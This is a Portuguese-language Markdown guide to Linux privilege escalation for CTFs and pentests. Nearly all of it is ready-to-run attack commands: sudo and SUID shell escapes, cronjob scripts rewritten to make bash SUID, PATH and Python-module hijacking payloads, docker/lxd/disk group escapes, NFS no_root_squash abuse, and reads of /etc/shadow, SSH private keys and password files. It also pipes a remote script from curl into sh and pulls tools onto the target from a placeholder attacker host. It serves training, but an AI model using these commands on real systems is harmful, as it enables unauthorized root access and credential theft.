	# 🐧 Linux Privilege Escalation — Guia Completo

> **O que é:** Após conseguir acesso inicial a uma máquina (shell como usuário comum), o próximo objetivo é escalar privilégios para **root** (UID 0). Essa é frequentemente a parte mais desafiadora de um CTF ou pentest.

---

## 🧠 Mentalidade e Metodologia

A escalação de privilégio em Linux se resume a **uma pergunta**: *"O que esse usuário pode fazer que o root não deveria ter permitido?"*

**Checklist mental — sempre seguir nesta ordem:**

1. **Quem eu sou?** → `id`, `whoami`, `groups`
2. **O que posso rodar como root?** → `sudo -l`
3. **Tem binário SUID estranho?** → `find / -perm -u=s`
4. **Tem cronjob rodando como root?** → `/etc/crontab`, `crontab -l`
5. **Tem arquivo sensível legível?** → `.bash_history`, `.env`, senhas em config
6. **Tem capabilities especiais?** → `getcap -r / 2>/dev/null`
7. **Estou em algum grupo especial?** → `docker`, `lxd`, `disk`, `adm`
8. **Tem compartilhamento NFS aberto?** → `/etc/exports` com `no_root_squash`
9. **A versão do kernel é antiga?** → `uname -a` → buscar exploit público

> **Dica de ouro:** Rode o **LinPEAS** (`linpeas.sh`) assim que entrar na máquina. Ele automatiza 90% dessa enumeração e destaca em **vermelho/amarelo** os vetores mais promissores.

---

## 1️⃣ Sudo — O Vetor Mais Comum

O comando `sudo -l` é **sempre** a primeira coisa a verificar. Ele mostra o que o usuário pode executar como root.

**Cenários possíveis:**

| Saída do `sudo -l` | O que fazer |
|---|---|
| `(ALL) NOPASSWD: ALL` | Você já é root: `sudo su` |
| `(ALL) NOPASSWD: /usr/bin/vim` | Pesquisar no GTFOBins |
| `(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py` | Verificar se pode editar o script |
| `(ALL) NOPASSWD: /usr/bin/env` | `sudo env /bin/bash` |
| `Sem nada` | Passe para a próxima técnica |

**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) — É um banco de dados de binários Unix que podem ser abusados para escapar de shells restritas, escalar privilégios, transferir arquivos, etc.

**Exemplos comuns:**
```
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo less /etc/shadow    → Dentro do less, digite: !/bin/bash
sudo env /bin/bash
sudo nmap --interactive  → !sh (versões antigas)
```

> **⚠️ Atenção com scripts personalizados:** Se o `sudo -l` mostra que você pode rodar um script específico como root (ex: `sudo /usr/bin/python3 /opt/app/script.py`), **analise o código desse script!** Pode ter falhas como:
> - `subprocess.run()` sem caminho absoluto → **PATH Hijacking**
> - Import de módulo Python que você pode substituir → **Library Hijacking**
> - O script executa arquivos de um diretório que você controla → **Como na máquina Retro.hc!**

---

## 2️⃣ SUID — Binários que Rodam como Dono

Quando um binário tem o bit **SUID** ativo, ele executa com as permissões do **dono do arquivo** (geralmente root), independente de quem o executa.

**Como encontrar:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Binários SUID comuns que NÃO são exploráveis:** `passwd`, `su`, `ping`, `mount`, `umount` → Já são esperados.

**Binários SUID que SÃO exploráveis (verificar no GTFOBins):**
- `find`, `vim`, `bash`, `nmap`, `python`, `php`, `perl`, `ruby`, `env`, `cp`, `mv`
- Qualquer binário **customizado** ou que você **não reconheça** → **INVESTIGAR!**

**Exemplo de exploração:**
```bash
# Se /usr/bin/find tem SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Se /usr/bin/python3 tem SUID:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Se bash tem SUID (ou você criou um com chmod +s):
bash -p    # A flag -p preserva o EUID de root
```

> **Conceito:** A flag `-p` do bash é crucial! Sem ela, o bash **descarta automaticamente** os privilégios elevados. Sempre use `bash -p` quando explorar binários SUID.

---

## 3️⃣ Cronjobs — Tarefas Agendadas Rodando como Root

Cronjobs são tarefas que rodam periodicamente. Se um cronjob roda como **root** e executa um script/arquivo que você pode **modificar**, você ganha root.

**Onde verificar:**
```bash
cat /etc/crontab                    # Crontab do sistema
ls -la /etc/cron.d/                 # Pasta de cron extras
ls -la /etc/cron.daily/             # Tarefas diárias
ls -la /etc/cron.hourly/            # Tarefas por hora
crontab -l                          # Crontab do usuário atual
cat /var/spool/cron/crontabs/*      # Crontabs de outros usuários (se tiver permissão)
```

**O que procurar:**
1. **Script com permissão de escrita para você** → Modificar o script com payload
2. **Script em diretório que você controla** → Deletar/recriar o script
3. **Wildcard `*` no comando** → Wildcard injection (tar, chmod, chown)
4. **Binário sem caminho absoluto** → PATH Hijacking

**Exemplo — Modificar script de cronjob:**
```bash
# Se /opt/backup.sh roda como root no cron e você pode escrever nele:
echo '#!/bin/bash' > /opt/backup.sh
echo 'chmod +s /bin/bash' >> /opt/backup.sh
# Espere o cron executar, depois:
bash -p
```

**Exemplo — Controle da pasta pai (como na Retro.hc!):**
```bash
# Se /home/user/roms/ pertence ao root mas /home/user/ pertence a você:
rm -rf /home/user/roms       # Deletar a pasta do root
mkdir /home/user/roms         # Recriar como SUA
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /home/user/roms/exploit.smc
chmod +x /home/user/roms/exploit.smc
# Quando o cronjob do root executar o arquivo, o bash ganha SUID!
```

> **Ferramenta útil:** Use `pspy` (https://github.com/DominicBreuker/pspy) para monitorar **processos em tempo real** sem precisar de root. Ele mostra cronjobs e processos que estão executando, mesmo os que não aparecem no crontab!

---

## 4️⃣ Arquivos Sensíveis — Senhas em Claro

Nunca subestime o poder de **ler arquivos**. Muitas vezes a senha do root está literalmente escrita em algum arquivo.

**O que procurar:**
```bash
# Histórico de comandos (geralmente tem senhas digitadas por acidente)
cat ~/.bash_history
cat ~/.zsh_history
cat /home/*/.bash_history 2>/dev/null

# Arquivos de configuração
cat .env
cat config.php
cat wp-config.php
cat /var/www/html/.env
cat /etc/shadow               # Se tiver permissão de leitura

# Procurar "password" em arquivos de config
grep -rnwi 'password' /var/www/ 2>/dev/null
grep -rnwi 'password' /opt/ 2>/dev/null
grep -rnwi 'password' /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.cnf" -o -name "*.ini" 2>/dev/null | xargs grep -i password 2>/dev/null

# Chaves SSH
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

> **Dica:** Após encontrar uma senha, sempre tente:
> 1. `su root` com essa senha
> 2. `su <outro_usuario>` com essa senha
> 3. Login SSH com essa senha
> 4. Pessoas **reutilizam senhas** — a senha do banco de dados pode ser a do root!

---

## 5️⃣ PATH Hijacking — Sequestro de Binários

Quando um script roda como root e chama um comando **sem caminho absoluto** (ex: `cat` em vez de `/bin/cat`), você pode criar um arquivo malicioso com o mesmo nome e manipular a variável `$PATH` para que o sistema encontre o seu arquivo primeiro.

**Como identificar:**
- Analisar scripts de cronjob ou scripts que rodam com sudo
- Procurar por chamadas como `system("cat arquivo")` ou `subprocess.run(["cat", arquivo])`

**Como explorar:**
```bash
# 1. Criar payload com o nome do binário
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat

# 2. Colocar /tmp no início do PATH
export PATH=/tmp:$PATH

# 3. Executar o script vulnerável
./script_vulneravel    # Quando ele chamar "cat", vai executar o SEU /tmp/cat
```

---

## 6️⃣ Capabilities — Permissões Granulares

Linux Capabilities são permissões mais finas que o SUID. Um binário pode ter capabilities específicas que permitem ações de root.

**Como encontrar:**
```bash
getcap -r / 2>/dev/null
```

**Capabilities perigosas:**
| Capability | Perigo |
|---|---|
| `cap_setuid` | Permite mudar o UID → shell de root direto |
| `cap_net_raw` | Permite capturar pacotes de rede (sniffing) |
| `cap_dac_override` | Ignora permissões de leitura/escrita de arquivos |
| `cap_sys_admin` | Quase equivalente a root completo |

**Exemplo de exploração:**
```bash
# Se python3 tem cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 7️⃣ Grupos Especiais

Estar em certos grupos permite escalar para root diretamente:

**Grupo `docker`:**
```bash
# Montar o sistema de arquivos inteiro dentro de um container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**Grupo `lxd`/`lxc`:**
```bash
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# Root do host estará em /mnt/root
```

**Grupo `disk`:**
```bash
debugfs /dev/sda1
# Dentro do debugfs → cat /etc/shadow
```

**Grupo `adm`:**
- Pode ler logs em `/var/log/` → Procurar senhas em logs de autenticação

---

## 8️⃣ Kernel Exploits — Último Recurso

Se nada funcionar, verifique se o kernel é vulnerável a exploits conhecidos.

**Como verificar:**
```bash
uname -a                # Versão do kernel
cat /etc/os-release     # Distribuição e versão
```

**Exploits famosos:**
| Kernel/Versão | Exploit | CVE |
|---|---|---|
| Linux < 3.9 | Dirty COW | CVE-2016-5195 |
| Linux < 5.8 | Dirty Pipe | CVE-2022-0847 |
| Polkit (pkexec) | PwnKit | CVE-2021-4034 |
| Sudo < 1.8.28 | Sudo Baron Samedit | CVE-2021-3156 |

**Como usar:**
```bash
# Pesquisar no searchsploit
searchsploit linux kernel <versão>
searchsploit linux privilege escalation

# Compilar e executar na máquina alvo
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

> **⚠️ Use kernel exploits como ÚLTIMO RECURSO!** Eles podem crashar a máquina. Em CTFs, geralmente a escalação é via uma das técnicas anteriores.

---

## 9️⃣ NFS — Root Squashing Desabilitado

Se o servidor exporta diretórios NFS com `no_root_squash`, qualquer arquivo criado como root na sua máquina será root no alvo.

**Como verificar:**
```bash
cat /etc/exports
# Procurar por: no_root_squash
showmount -e <IP_ALVO>
```

**Como explorar (da sua máquina atacante):**
```bash
mkdir /tmp/nfs
sudo mount -t nfs <IP_ALVO>:<SHARE> /tmp/nfs
sudo cp /bin/bash /tmp/nfs/rootbash
sudo chmod +s /tmp/nfs/rootbash

# Na máquina alvo:
./rootbash -p
```

---

## 🔟 Library/Module Hijacking (Python, Node.js)

Quando um script roda como root e **importa módulos**, se você puder escrever no diretório de módulos ou no mesmo diretório do script, pode criar um módulo malicioso.

**Python — Hijacking de import:**
```bash
# Se o script /opt/app.py executa como root e faz "import utils":
# Verificar o PYTHONPATH e os diretórios de busca de módulos
python3 -c "import sys; print(sys.path)"

# Criar módulo malicioso no diretório do script (se tiver escrita):
echo 'import os; os.system("chmod +s /bin/bash")' > /opt/utils.py

# Quando o script executar, ele importa O SEU utils.py
```

---

## 🔄 Resumo — Fluxo de Privilege Escalation

```
Acesso Inicial (shell básica)
          │
          ├─→ sudo -l              → GTFOBins / Analisar scripts
          ├─→ find SUID            → GTFOBins / bash -p
          ├─→ cat /etc/crontab     → Modificar script / Wildcard injection
          ├─→ Ler .bash_history    → Senhas em claro → su root
          ├─→ Ler .env / config    → Senhas de DB → testar com su
          ├─→ getcap               → cap_setuid / cap_sys_admin
          ├─→ id (groups)          → docker / lxd / disk
          ├─→ cat /etc/exports     → NFS no_root_squash
          └─→ uname -a             → Kernel exploit (último recurso)
                  │
                  ▼
             ROOT! 🎉
```

---

## 🛠️ Ferramentas de Enumeração Automática

| Ferramenta | Uso |
|---|---|
| **LinPEAS** | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **LinEnum** | Script bash de enumeração clássico |
| **pspy** | Monitora processos em tempo real (descobre cronjobs ocultos) |
| **linux-exploit-suggester** | Sugere kernel exploits baseado na versão |

> **Como transferir ferramentas para o alvo:**
> ```bash
> # Na sua máquina (servidor HTTP):
> python3 -m http.server 8080
>
> # No alvo (download):
> wget http://SEU_IP:8080/linpeas.sh
> # ou
> curl http://SEU_IP:8080/linpeas.sh -o linpeas.sh
> chmod +x linpeas.sh
> ./linpeas.sh
> ```
